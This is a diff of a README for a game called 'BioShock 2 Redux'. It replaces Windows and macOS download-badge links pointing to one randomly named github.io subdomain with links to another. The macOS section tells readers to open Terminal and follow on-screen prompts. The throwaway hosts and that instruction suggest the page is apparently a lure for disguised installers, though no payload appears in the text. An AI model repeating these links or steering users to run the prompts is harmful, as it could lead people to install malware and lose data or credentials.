@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_BioShock%202%20Redux-F9A825?style=for-the-badge&logo=github)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download](https://img.shields.io/badge/Download_BioShock%202%20Redux-F9A825?style=for-the-badge&logo=github)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 </div>
 
@@ -51,9 +51,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
 
 </div>
 
@@ -63,7 +63,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download_BioShock%202%20Redux-F9A825?style=for-the-badge&logo=github)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download](https://img.shields.io/badge/Download_BioShock%202%20Redux-F9A825?style=for-the-badge&logo=github)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 </div>
 
@@ -93,7 +93,7 @@
 
 ## macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
 
 1. Open **Terminal** (`Cmd + Space` -> Terminal)
 2. Follow the on-screen prompts
